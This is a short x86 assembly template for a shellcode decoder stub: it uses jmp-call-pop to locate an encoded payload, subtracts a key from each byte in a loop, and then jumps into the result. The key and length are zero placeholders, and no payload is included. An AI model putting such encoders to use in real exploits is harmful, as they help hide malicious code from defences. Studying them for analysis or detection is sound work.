 BITS 32
 
 jmp short one
 decoder:
 pop esi
 xor ecx , ecx
 mov cx , 0
 loop:
 sub byte [esi + ecx - 1], 0
 dec cx
 jnz loop
 jmp short codedShellcode
 one:
 call decoder
 codedShellcode: